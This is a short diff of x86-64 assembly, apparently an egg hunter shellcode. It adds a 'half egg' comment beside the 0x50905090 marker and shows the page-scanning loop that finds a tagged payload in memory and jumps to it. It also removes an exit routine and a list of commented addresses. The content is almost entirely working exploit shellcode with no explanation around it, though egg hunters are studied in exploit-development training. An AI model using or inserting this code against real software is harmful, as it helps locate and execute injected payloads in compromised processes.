@@ -4,6 +4,7 @@ section .text
 
 _start:
 
+	; half egg
 	mov ebx, 0x50905090
 	xor rcx, rcx
 	mul rcx
@@ -47,17 +48,3 @@ scan_page:
 	cmp dword [rdx+0x4], ebx
 	jnz scan_page
 	jmp rdx
-
-exit:
-
-	xor rax, rax
-	add rax, 60
-	syscall
-
-; 0x0000000b29d52000
-; 0x0000003d58193000
-; 0x00000057e9796000
-; 0x0000011021e85000
-; 0x000003568fd4b000
-; 0x000008f3bdfb9000
-; 0x0000555555558020
